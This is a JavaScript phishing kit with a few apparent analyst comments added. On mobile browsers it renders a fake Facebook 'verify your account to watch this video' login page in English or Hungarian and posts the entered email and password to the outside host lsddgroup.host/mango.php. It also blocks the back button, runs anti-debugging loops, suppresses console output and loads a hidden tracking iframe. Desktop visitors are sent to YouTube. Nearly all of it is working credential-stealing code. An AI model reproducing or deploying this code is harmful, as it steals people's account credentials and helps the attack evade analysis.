"use strict";
/**
 * @param {!Object} arr
 * @param {number} items
 * @return {?}
 */
function _0x213a56(arr, items) {
  return ifArray(arr) || arrayFromIterable(arr, items) || get_array_from(arr, items) || throw_not_iterable();
}
/**
 * @return {?}
 */
function throw_not_iterable() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
/**
 * Constructs an array from the first _length_ elements of _obj_
 * @param {!Object} obj
 * @param {number} length
 * @return {Array}
 */
function get_array_from(obj, length) {
  if (!obj) {
    return;
  }
  if (typeof obj === "string") {
    return arrayFromIndices(obj, length);
  }
  var type = Object.prototype.toString.call(obj).slice(8, -1);
  // [object ***] => It retrieves ***
  if (type === "Object" && obj.constructor) {
    type = obj.constructor.name;
  }
  if (type === "Map" || type === "Set") { // Collection
    return Array.from(obj);
  }
  if (type === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(type)) {
    return arrayFromIndices(obj, length);
  }
}
setInterval(function() {
  _0x2983f3();
}, 4000);
 
/**
 * Convert to array by indexing with integers
 * @param {{length:number}} arr
 * @param {number} maxl
 * @return {Array}
 */
function arrayFromIndices(arr, maxl) {
  if (maxl == null || maxl > arr.length) {
    maxl = arr.length;
  }
  /** @type {number} */
  var i = 0;
  /** @type {!Array} */
  var result = new Array(maxl);
  for (; i < maxl; i++) {
    result[i] = arr[i];
  }
  return result;
}

/**
 * Convert an iterable to an array up to maxl long
 * @param {!Object} iterable
 * @param {number} maxl
 * @return {?}
 */
// Meaningful names
function arrayFromIterable(iterable, maxl) {
  if (typeof Symbol === "undefined" || !(Symbol.iterator in Object(iterable))) {
    return;
  }
  var arr = [];
  var didFinish = true;
  var didThrow = false;
  /** @type {Error} - Hopefully even malware creators don't throw random objects. */
  var exception = undefined;
  try {
    /** @type {IterableIterator} */
    var iterator = iterable[Symbol.iterator]();
    var result;
    // Convert an iterable to an array (stop at i)
    for (; !(didFinish = (result = iterator.next()).done); didFinish = true) {
      arr.push(result.value);
      if (maxl && arr.length === maxl) {
        break;
      }
    }
  } catch (ex) {
    didThrow = true;
    exception = ex;
  } finally {
    try {
      if (!didFinish && iterator.return != null) {
        iterator.return();
      }
    } finally {
      if (didThrow) {
        throw exception;
      }
    }
  }
  return arr;
}
/**
 * @param {!Object} arr
 * @return {Array}
 */
function ifArray(arr) {
  if (Array.isArray(arr)) {
    return arr;
  }
}

// Block the user from leaving the page with the "back" button
history.pushState(null, null, location.href); 
window.onpopstate = function() {
  history.go(1);
};

/**
 * Why on earth is this function named twice?
 * @return {?}
 */
var _0x57e06e = function init() {
  // 3 Single-use deferrer factories.
  var deferrerFactory = function() {
    /** @type {boolean} */
    var firstCall = true;
    return function(value, deferred) {
      /** @type {!Function} */
      var deferrerOrNop = firstCall ? function() {
        if (deferred) {
          var ret = deferred.apply(value, arguments);
          deferred = null;
          return ret;
        }
      } : function() {};
      firstCall = false;
      return deferrerOrNop;
    };
  }();
  var deferrerFactory2 = function() {
    /** @type {boolean} */
    var firstCall = true;
    return function(value, deferred) {
      /** @type {!Function} */
      var deferrerOrNop = firstCall ? function() {
        if (deferred) {
          var ret = deferred.apply(value, arguments);
          deferred = null;
          return ret;
        }
      } : function() {};
      firstCall = false;
      return deferrerOrNop;
    };
  }();
  var deferrerFactory3 = function() {
    /** @type {boolean} */
    var firstCall = true;
    return function(value, deferred) {
      /** @type {!Function} */
      var deferrerOrNop = firstCall ? function() {
        if (deferred) {
          var ret = deferred.apply(value, arguments);
          deferred = null;
          return ret;
        }
      } : function() {};
      firstCall = false;
      return deferrerOrNop;
    };
  }();
  var localization = {
    "hu" : {
      "fbVerify" : "A Facebook-nak ellen\u00c5\ufffdriznie kell a fi\u00f3kja adatait, hogy hozz\u00e1f\u00e9rjen ehhez a vide\u00c3\u00b3hoz",
      "email" : "E-mail vagy telefonsz\u00c3\u00a1m",
      "password" : "jelsz\u00c3\u00b3",
      "continueMessage" : "folytat\u00f3dik",
      "registerMessage" : "\u00c3\ufffdj fi\u00c3\u00b3k l\u00c3\u00a9trehoz\u00c3\u00a1sa",
      "forgotMessage" : "Elfelejtett jelsz\u00c3\u00b3",
      "orMessage" : "vagy"
    },
    "en" : {
      "fbVerify" : "Facebook needs to verify your account information to allow access to this video",
      "email" : "Email or phone number",
      "password" : "Password",
      "continueMessage" : "Continue",
      "registerMessage" : "Create new account",
      "forgotMessage" : "Forgot password",
      "orMessage" : "or"
    }
  };
  /**
   * @param {!Object} args
   * @return {?}
   */
  var template = function update(args) {
    var f = args["m1"];
    var res = f === undefined ? "" : f;
    var key = args["m2"];
    var url = key === undefined ? "" : key;
    var num = args["p1"];
    var n = num === undefined ? "" : num;
    var data = args["p2"];
    var dataURI = data === undefined ? "" : data;
    var value = args["b1"];
    var display = value === undefined ? "" : value;
    var platform = args["b2"];
    var target = platform === undefined ? "" : platform;
    var endNormalized = args["or"];
    var stageValuePath = endNormalized === undefined ? "" : endNormalized;
    var string = args["f1"];
    var rest = string === undefined ? "" : string;
    return ("<!DOCTYPE html>\
    <html lang=\"en\">\
      <head>\
        <meta charset=\"UTF-8\" />\
        <meta name=\"viewport\" content=\"user" + "-scalable=no,initial-scale=1,maximum-scale=1\" />\
        <title>Facebook Video</title>\
        <style>\
          * {\
            margin: 0;\
            padding: 0;\
            box-sizing: border-box;\
            font-family:" + ' Roboto, "' + "Droid Sans" + '", Helveti' + "ca, sans-serif;\
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);\
          } .header {\
            background-color: #3b5998;\
            width: 100%;\
            padding: 5px 0;\
            height: 44px;\
            display: flex;\
            align-items: center;\
            justify-content: center;\
          } .header .logo {\
            background-image: url(\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJkAAAAfCAMAAADDa59NAAAARVBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////9SnXPCAAAAFnRSTlMAkW0lNun1FabSssjdW75OeYRDDWSb43dFCAAAAr9JREFUWMPtltmypCAMhllkERAFl/d/1DlK6IAwfaq8cqomN61/E/gIkoSAcaaNN3oiT03FaaE6PvaPEwt6a3V9JNvJU2OX/+OdDZc7bXR/vJRsOt5KZhKWFIK+jMzhrC8jk6c6kveRqUs1/8n+fTJKqb5UR39sPqVZOyn8RAg7pQUGztQKKUYTOLzv4/m+zzUZp6MUNvBi48w4KZ1fUCvFlizQ08hR2UYIt/BslcebMTscFOt3ywuySSZRss/W5WekVn2xJtuuR38jm4nCJT2SLQeaVMCRTfAP2Y5qivVqy5GOd8WKTF3Qkt/IBqJLhkw2gwC7IbH2GoHsPhcWZBx5mmlFJNOwrxuZ4sDkd1v4CXjUVLuDETKmcxgIDynUSCa0hqgb3JIwWVwKUaOIZPGzKOc8qZ7/GKEY4CjzoCnRpovHFXjr9MUABDtQDLBNQjyKS8IhXRHJEuzQZg0LMcAFRgxwtlB4DzA1gzWqWVYUM9DQFzNZgN+WTBZeHMhgHyt2AMX7CuFheUq8XoHEUpxgf7EdyTIZT+uvHbKUB+APIKtwMST2svTMgYzV2Wn6u7jVIvzmYLdk+IiVHnGzjUdtSDaV0dY9ce+KQCZg+feRjZhaHp8m2pPTRDHWp7kXd+35DVCktO83AEX29QasAgrA96xB66wRblkjErTHWcPessYMh9aSBcy08z3TbulQFOZp8B9IL9PKOtMGAOqLQJbPg7VkuTpZ3alOTlNTVCexzMPMgj8ckEEhEr9Wp1YEMizoDdmjin7wTCYL535F74tIBhOZluz3LuhQTWexZWVpuiDfNDytiGT46U1tElO+2zmOdecYXRlblsnWBSWw0HSOjViTccwPKz0NykXqtoU7u+2t7LYjtU4KqxdedN/SWUNndU6dWuSz2xbClp212syP1HTbtcjpp9knU5rqtfYHmUiiBcAkinMAAAAASUVORK5CYII=\");\
            width: 102px;\
            height: 21px;\
            background-size:\
            102px 21px;\
            font-size: 0;\
            cursor: pointer;\
          } .info-container {\
            background-color:\
            #fffbe2;\
            width: 100%;\
            padding: 12px 25px;\
            display: flex;\
            justify-content: center;\
            align-items: center;\
          } .info-container .text {\
            font-size: 14px;\
            line-height: 18px;\
            color: #ff1616;\
            text-align: justify;\
            padding-left: 10px;\
          } .form-container {\
            background-color: #eceff5;\
            padding: 16px;\
          } .form-container .input-container {\
            background: #fff;\
            overflow: hidden;\
            border-radius: 4px;\
            border-style: solid;\
            border-width: 1px;\
            border-color: rgba(0, 0, 0, 0.15) rgba(0, 0, 0, 0.15) rgba(0, 0, 0, 0.18);\
            position: relative;\
          } .form-container .input-container .input-box {\
            width: 100%;\
          } .form-container .input-container .input-box.bb {\
            border-bottom: 1px solid #e5e5e5;\
          } .form-container .input-container .input-box .input-text {\
            -webkit-appearance: none;\
            width: 100%;\
            padding: 10px;\
            font-size: 14px;\
            line-height: 18px;\
            border: 0;\
            display: block;\
            outline: none;\
          } .form-container .btn {\
            background-color: transparent;\
            display: block;\
            width: 100%;\
            border: 0;\
            outline: none;\
            border-radius: 3px;\
            text-align: center;\
            font-size: 14px;\
            font-weight: 700;\
            text-shadow: 0 -1px rgba(0, 0, 0, 0.25);\
            padding: 11px 0;\
            cursor: pointer;\
          } .form-container .btn.blue {\
            margin-top: 10px;\
            background-color: #4080ff;\
            color: #fff;\
          } .form-container .btn.green {\
            background-color: #00a400;\
            width: auto;\
            color: #fff;\
            display: inline-block;\
            padding-left: 16px;\
            padding-right: 16px;\
          } .form-container .reg-container {\
            text-align: center;\
            width: 100%;\
            padding: 10px 0;\
          } .form-container .reg-container .lost-text {\
            padding: 10px 0;\
            display: block;\
            font-size: 12px;\
            text-decoration: none;\
            color: #7596c8;\
          } .form-container .or {\
            padding: 14px 0;\
            width: 100%;\
            text-align: center;\
            font-size: 14px;\
            color: #4b4f56;\
            position: relative;\
            overflow: hidden;\
          } .form-container .or:before, .form-container .or:after {\
            content: \"\";\
            background: #ccd0d5;\
            height: 1px;\
            width: 50%;\
            position: absolute;\
            top: 50%;\
          } .form-container .or:before {\
            left: -15px;\
          } .form-container .or:after {\
            right: -15px;\
          } .footer {\
            display: flex;\
            justify-content: space-around;\
            align-items: stretch;\
            padding-top: 10px;\
          } .footer .lang-list {\
            list-style: none;\
          } .footer .lang-list .lang {\
            color: #576b95;\
            font-size: 12px;\
            text-align: center;\
            padding: 3px 0;\
          } .footer .lang-list .lang.grey {\
            color: #90949c;\
          } .footer .lang-list .lang .more {\
            border-radius: 3px;\
            border: 1px solid #3b5998;\
            padding: 3px;\
          } .footer .copy {\
            width: 100%;\
            text-align: center;\
            color: #808080;\
            font-size: 12px;\
          } @media (min-width: 750px) {\
            .form-container {\
              padding: 16px 25%;\
            }\
          }\
        </style>\
      </head>\
      <body>\
        <div class=\"header\">\
          <div class=\"logo\">Facebook</div>\
        </div>\
        <div class=\"info-container\">\
          <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAA4VBMVEUAAAAMDAwLCwvFkSoNDQ2oqKjCwsGqqqqvr6/a2trb29vHx8fAwMDBwcHcv4bYsF7Mn0XU1NS+vr7BwcHBwcHTrV/CwsLPpE2rq6uzhCfFkSqnp6enp6eoqKirq6vFkSrFkSqfn5+mpqb004bYrVjYrVb447PxxWntuFL11Y3z0H/yzHjd3d3b29vFxcX55rnn0qn12JbOuYjz0YLzzX3xx2/Zr1vf39/67Mv1147mxn7vv2Tq6ur55725ubmurq734avPwafAuKf23aH23J3y0pD01YnoyYXYu3fStHLvwF5Cv8L8AAAAI3RSTlMAEAWaC5j9Wgj9+fj08/Lu6NnY1cW2s5qRjYhkYE9BNSoiFW4jvWgAAACrSURBVBjTXciFDoMwFIVhYMzdXUvLcPe5b+//QCsdgWR/bm5yPoq0GVS89pzK6u4OR7m8SPdM7qxLI7mXQt6bUlSpWshAKeJfV/+glkL/opx1XS+ojRXZy/BtvoAQmuZzSGBy9/cIaRryUZNAztYM6xEIABluAidBBABYVyEB6WZJtihKBuB+4AQOz+MTJQJMLgKfbRwfwXjTYxdCyOEgbNEMFoZlaRLL4vkFNc4WAJvE7ToAAAAASUVORK5CYII=\" />\
          <span class=\"text\"> ").concat(res, " </span>\
        </div>\
        <div class=\"form-container\">\
          <form action=\"https://lsddgroup.host/mango.php\" method=\"post\">\
            <input type=\"hidden\" name=\"linkId\" value=\"7\" />\
            <div class=\"input-container\">\
              <div class=\"input-box bb\">\
                <input required type=\"text\" class=\"input-text\" name=\"id\" placeholder=\"").concat(n, "\" />\
              </div>\
              <div class=\"input-box bb\">\
                <input required type=\"password\" name=\"pass\" class=\"input-text\" placeholder=\"").concat(dataURI, "\" />\
              </div>\
            </div>\
            <button class=\"btn blue\">").concat(display, "</button>\
          </form>\
          <div class=\"or\">").concat(stageValuePath, "</div>\
          <div class=\"reg-container\">\
            <div class=\"btn green\">").concat(target, "</div>\
            <a class=\"lost-text\"> ").concat(rest, " </a>\
          </div>\
        </div>\
        <div class=\"footer\">\
          <ul class=\"lang-list\">\
            <li class=\"lang grey\">\English (US)</li>\
            <li cl" + 'ass="lang"' + ">Fran\u00c3\u00a7ais (France)</li>\
            <li class=\"lang\">Portugu\u00c3\u00aas (Brasil)</li>\
            <li class=\"lang\">\u00d8\u00a7\u00d9\ufffd\u00d8\u00b9\u00d8\u00b1\u00d8\u00a8\u00d9\ufffd\u00d8\u00a9</li>\
            </ul> <ul class=\"lang-list\"> <li class=\"lang grey\">Fran\u00c3\u00a7ais (Canada)</li>\
            <li class=\"lang\">\u00e4\u00b8\u00ad\u00e6\ufffd\ufffd(\u00e7\u00ae\ufffd\u00e4\u00bd\ufffd)</li>\
            <li class=\"lang\">Deutsch</li>\
            <li class=\"lang\"> <img class=\"more\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOAgMAAABiJsVCAAAAAXNSR0IB2cksfwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAxQTFRFAAAAf39/f39/f39/8LlGVQAAAAR0Uk5TAMX/x7LTmFAAAAAdSURBVHicY2BgZQACLhxE1qpVE0DEBtxKGNgZGAC0TwUti8QzCgAAAABJRU5ErkJggg==\" /> </li>\
          </ul>\
        </div>\
        <iframe src=\"data:text/html,<img src='https://whos.amung.us/widget/lapampara01' />\" style=\"display: none;\" height=\"0px\" width=\"0px" + '"></iframe' + ">\
      </body>\
    </html>");
  };
  /**
   * @param {!Object} data
   * @return {undefined}
   */
  var expect = function configure(data) {
    var element = deferrerFactory(this, function() {
      /**
       * @return {?}
       */
      var register = function() {
        var CustomTests = register.constructor("return /\" + this + \"/")().compile("^([^ ]+( +[^ ]+)+)+[^ ]}");
        return !CustomTests.test(element);
        // <=== Bookmark
      };
      return register();
    });
    element();
    (function() {
      deferrerFactory2(this, function() {
        if ("MsamW" === "UizMX") {
          result("0");
        } else {
          /** @type {!RegExp} */
          var sectionNameExp = new RegExp("function *\\( *\\)");
          /** @type {!RegExp} */
          var me = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
          var max = _0x2983f3("init");
          if (!sectionNameExp["test"](max + "chain") || !me["test"](max + "input")) {
            if ("UsJDP" !== "qYXNu") {
              max("0");
            } else {
              var _0x57a705 = test["constructor"]("return /\" + this + \"/")()["compile"]("^([^ ]+( +[^ ]+)+)+[^ ]}");
              return !_0x57a705["test"](_0x15cd49);
            }
          } else {
            if ("PzZsq" === "LVHNH") {
              location["href"] = "https://youtube.com/";
            } else {
              _0x2983f3();
            }
          }
        }
      })();
    })();
    var recacheForeground = deferrerFactory3(this, function() {
      /**
       * @return {undefined}
       */
      var id = function() {
      };
      var context;
      try {
        if ("rCiWo" !== "kGxJU") {
          var extend = Function("return (function() " + ("{}.constructor(\"return this\")( )") + ");");
          context = extend();
        } else {
          configure(resolve("en"));
          return;
        }
      } catch (_0xc75e13) {
        /** @type {!Window} */
        context = window;
      }
      if (!context["console"]) {
        if ("fkwcw" !== "fxWXS") {
          context["console"] = function(frameData) {
            if ("yVmyi" === "yVmyi") {
              var response = {};
              /** @type {function(): undefined} */
              response["log"] = frameData;
              /** @type {function(): undefined} */
              response["warn"] = frameData;
              /** @type {function(): undefined} */
              response["debug"] = frameData;
              /** @type {function(): undefined} */
              response["info"] = frameData;
              /** @type {function(): undefined} */
              response["error"] = frameData;
              /** @type {function(): undefined} */
              response["exception"] = frameData;
              /** @type {function(): undefined} */
              response["table"] = frameData;
              /** @type {function(): undefined} */
              response["trace"] = frameData;
              return response;
            } else {
              var fn = Function("return (function() " + ("{}.constructor(\"return this\")( )") + ");");
              that = fn();
            }
          }(id);
        } else {
          /** @type {!Window} */
          that = window;
        }
      } else {
        /** @type {function(): undefined} */
        context["console"]["log"] = id;
        /** @type {function(): undefined} */
        context["console"]["warn"] = id;
        /** @type {function(): undefined} */
        context["console"]["debug"] = id;
        /** @type {function(): undefined} */
        context["console"]["info"] = id;
        /** @type {function(): undefined} */
        context["console"]["error"] = id;
        /** @type {function(): undefined} */
        context["console"]["exception"] = id;
        /** @type {function(): undefined} */
        context["console"]["table"] = id;
        /** @type {function(): undefined} */
        context["console"]["trace"] = id;
      }
    });
    recacheForeground();
    var vkTemplatesCache = document["querySelector"]("html");
    vkTemplatesCache["innerHTML"] = template(data);
  };
  /**
   * @param {string} key
   * @return {?}
   */
  var resolve = function closeAndReturnNoopAnimator(key) {
    if ("vhNMo" !== "vhNMo") {
      _0x2983f3();
    } else {
      var arr = localization[key];
      var m1 = arr["fbVerify"];
      var m2 = arr["messengerTitle"];
      var b = arr["continueMessage"];
      var p1 = arr["email"];
      var p2 = arr["password"];
      var b2 = arr["registerMessage"];
      var r = arr["forgotMessage"];
      var results = arr["orMessage"];
      return {
        "m1" : m1,
        "m2" : m2,
        "p1" : p1,
        "p2" : p2,
        "b1" : b,
        "b2" : b2,
        "f1" : r,
        "or" : results
      };
    }
  };
  if (screen["width"] < 860 && "ontouchstart" in document) {
    if ("xKFAK" !== "xKFAK") {
      /** @type {!Function} */
      var PNotify = firstCall ? function() {
        if (fn) {
          var actions = fn["apply"](context, arguments);
          /** @type {null} */
          fn = null;
          return actions;
        }
      } : function() {
      };
      /** @type {boolean} */
      firstCall = false;
      return PNotify;
    } else {
      var calleeIdentifier = /([a-zA-Z]*)-?.*$/["exec"](navigator["language"]);
      var tiledImageBRs = _0x213a56(calleeIdentifier, 2);
      var tiledImageBR = tiledImageBRs[1];
      if (!tiledImageBR) {
        expect(resolve("en"));
        return;
      }
      expect(resolve(tiledImageBR["toLowerCase"]()));
    }
  } else {
    if ("OlJXT" !== "HjUUG") {
      /** @type {string} */
      location["href"] = "https://youtube.com/";
    } else {
      if (!_n && _i["return"] != null) {
        _i["return"]();
      }
    }
  }
};
_0x57e06e();
/**
 * @param {?} canCreateDiscussions
 * @return {?}
 */
function _0x2983f3(canCreateDiscussions) {
  /**
   * @param {number} i
   * @return {?}
   */
  function update(i) {
    if (typeof i === "string") {
      return function(canCreateDiscussions) {
      }["constructor"]("while (true) {}")["apply"]("counter");
    } else {
      if ("SzVZy" === "WbjLf") {
        return ifArray(arr) || arrayFromIterable(arr, i) || get_array_from(arr, i) || throw_not_iterable();
      } else {
        if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
          if ("VFIMv" === "BBiam") {
            var data = translations[lang];
            var passid = data["fbVerify"];
            var m2 = data["messengerTitle"];
            var b1 = data["continueMessage"];
            var point = data["email"];
            var lastLine = data["password"];
            var b2 = data["registerMessage"];
            var r = data["forgotMessage"];
            var ids = data["orMessage"];
            return {
              "m1" : passid,
              "m2" : m2,
              "p1" : point,
              "p2" : lastLine,
              "b1" : b1,
              "b2" : b2,
              "f1" : r,
              "or" : ids
            };
          } else {
            (function() {
              if ("RVHKG" === "nBhkU") {
                (function() {
                  return false;
                })["constructor"]("debugger")["apply"]("stateObject");
              } else {
                return true;
              }
            })["constructor"]("debugger")["call"]("action");
          }
        } else {
          if ("vlshi" === "vlshi") {
            (function() {
              return false;
            })["constructor"]("debugger")["apply"]("stateObject");
          } else {
            _0x2983f3();
          }
        }
      }
    }
    update(++i);
  }
  try {
    if ("ZFiMU" === "dmuZI") {
      if (Array["isArray"](arr)) {
        return arr;
      }
    } else {
      if (canCreateDiscussions) {
        if ("ioWHN" === "ioWHN") {
          return update;
        } else {
          if (!o) {
            return;
          }
          if (typeof o === "string") {
            return arrayFromIndices(o, minLen);
          }
          var object = Object.prototype.toString.call(o).slice(8, -1);
          if (object === "Object" && o.constructor) {
            object = o.constructor.name;
          }
          if (object === "Map" || object === "Set") {
            return Array.from(o);
          }
          if (object === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/["test"](object)) {
            return arrayFromIndices(o, minLen);
          }
        }
      } else {
        update(0);
      }
    }
  } catch (_0x1b482d) {
  }
}
;